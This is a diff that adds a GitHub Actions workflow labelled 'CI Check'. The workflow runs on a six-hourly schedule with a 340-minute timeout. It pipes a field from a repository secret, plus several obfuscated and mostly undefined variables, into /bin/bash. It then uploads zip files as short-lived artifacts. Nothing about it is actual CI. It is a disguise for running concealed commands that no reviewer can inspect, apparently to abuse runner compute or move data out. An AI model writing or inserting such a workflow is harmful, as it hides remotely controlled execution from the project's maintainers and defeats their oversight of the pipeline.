@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 2,8,14,20 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          e12358: ${{ secrets.e12358 }}
+        run: |
+          printf '%s' "$e12358" | jq -r .u34443 | /bin/bash
+          echo $d1 | jq -r .cfs08 | /bin/bash
+          printf '%s' "$gqqzw945" | jq -r .hvrdf575 | /bin/bash
+          printf '%s' "$qxn2844" | jq -r .pxsl79 | /bin/bash
+          echo $q88861 | jq -r .tsdvg7560 | /bin/bash
+          printf '%s' "$btqhc64528" | jq -r .cv5 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: jVylLNO8
+          path: "*.zip"
+          retention-days: 1
